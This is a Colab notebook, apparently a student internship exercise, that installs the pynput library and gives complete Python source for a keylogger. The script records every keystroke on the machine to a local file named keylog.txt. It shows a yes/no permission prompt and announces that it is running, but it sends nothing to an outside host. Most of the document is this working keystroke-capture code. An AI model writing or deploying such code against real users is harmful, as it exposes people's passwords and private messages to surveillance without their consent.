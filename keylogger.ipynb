{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyOdMP3MOz08Wjyayq4eg/k0",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/optimisticace2003/Prodigy-Infotech/blob/main/keylogger.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "pip install pynput\n",
        "#INSTALL THE REQUIREMENT ---------------------------------------------------------------------"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "PGJDV41RUOsM",
        "outputId": "bfffe1a3-ca4a-43e1-ea5e-d7be4633d990"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: pynput in /usr/local/lib/python3.10/dist-packages (1.7.7)\n",
            "Requirement already satisfied: six in /usr/local/lib/python3.10/dist-packages (from pynput) (1.16.0)\n",
            "Requirement already satisfied: evdev>=1.3 in /usr/local/lib/python3.10/dist-packages (from pynput) (1.7.1)\n",
            "Requirement already satisfied: python-xlib>=0.17 in /usr/local/lib/python3.10/dist-packages (from pynput) (0.33)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "oOExHbsOT-Mv"
      },
      "outputs": [],
      "source": [
        "#####################################################################################\n",
        "#THIS CODE WILL WORK ONLY IN COMMAND PROMPT\n",
        "#open cmd and type - (before make sure python is installled in cmd )\n",
        "# python file_name\n",
        "#####################################################################################\n",
        "\n",
        "\n",
        "import pynput.keyboard as keyboard\n",
        "import sys\n",
        "\n",
        "\n",
        "log_file = \"keylog.txt\"\n",
        "\n",
        "def on_press(key):\n",
        "    try:\n",
        "        with open(log_file, \"a\") as f:\n",
        "            f.write(f\"{key.char}\")\n",
        "    except AttributeError:\n",
        "        with open(log_file, \"a\") as f:\n",
        "            f.write(f\" {key} \")\n",
        "\n",
        "def main():\n",
        "    print(\"This script will log all keystrokes on this machine.\")\n",
        "    permission = input(\"Do you have permission to run this keylogger? (yes/no): \").strip().lower()\n",
        "\n",
        "    if permission != 'yes':\n",
        "        print(\"Permission not granted. Exiting...\")\n",
        "        sys.exit()\n",
        "\n",
        "    print(\"Keylogger is running. Press Ctrl + C to stop.\")\n",
        "\n",
        "    try:\n",
        "        with keyboard.Listener(on_press=on_press) as listener:\n",
        "            listener.join()\n",
        "    except KeyboardInterrupt:\n",
        "        print(\"\\nKeylogger stopped. Exiting...\")\n",
        "        sys.exit()\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    main()\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "QZT-4aTKaRHd"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}